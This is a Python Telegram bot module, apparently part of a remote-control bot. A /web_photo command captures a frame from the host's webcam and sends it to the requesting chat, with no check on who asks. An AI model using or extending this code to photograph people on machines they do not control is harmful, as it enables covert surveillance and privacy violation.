from start_bot import dp, logger, bot
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile, BufferedInputFile
from aiogram.enums import ChatAction
import pyautogui
import cv2
import io



@dp.message(Command("web_photo"))
async def web_photo(message: Message):
	try:
		try:
			await bot.send_message(message.chat.id, "Спроба зробити знімок")
			cap = cv2.VideoCapture(0)
			ret, img = cap.read()
			cap.release()
			is_success, buffer = cv2.imencode(".png", img)
			await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_PHOTO)
			await bot.send_photo(message.chat.id, BufferedInputFile(io.BytesIO(buffer).getvalue(), filename="web.png"))
		except Exception as e:
			await bot.send_message(message.chat.id, "Помилка знімку")
			await bot.send_message(message.chat.id, str(e))
	except:
		pass
				